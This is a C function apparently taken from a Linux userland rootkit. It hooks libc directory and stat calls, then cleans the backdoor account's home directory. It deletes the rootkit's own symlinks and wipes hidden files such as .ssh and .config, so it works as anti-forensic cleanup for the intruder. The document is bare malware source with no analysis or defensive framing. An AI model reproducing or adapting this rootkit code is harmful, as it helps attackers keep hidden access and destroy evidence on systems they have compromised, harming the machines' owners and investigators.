void bdvcleanse(void){
    if(!initmvbc() || rknomore() || magicusr() || rkprocup())
        return;

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    int c;
    char **dests = bdvlinkdests(&c);
    if(!dests) return;

    DIR *dp = call(COPENDIR, mvbc->homedir);
    if(dp == NULL){
        for(int i = 0; i < c; i++)
            clean(dests[i]);
        free(dests);
        return;
    }

    const size_t homelen = strlen(mvbc->homedir);
    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;

        const size_t pathlen = homelen + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", mvbc->homedir, dir->d_name);

        struct stat pathstat;
        memset(&pathstat, 0, sizeof(struct stat));
        int lstatstat = (long)call(C__LXSTAT, _STAT_VER, path, &pathstat);

        /* if the thing isn't a hidden home directory, remove it if it's one of our symlinks.
         * otherwise remove it entirely. (removes directories & files like .ssh & .config) */
        if(*dir->d_name != '.'){
            if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
                continue;
            for(int i = 0; i < c; i++)
                if(strcmp(strrchr(dests[i], '/') + 1, dir->d_name) == 0)
                    rm(path);
        }else rm(path);
    }
    closedir(dp);
    for(int i = 0; i < c; i++)
        clean(dests[i]);
    free(dests);
}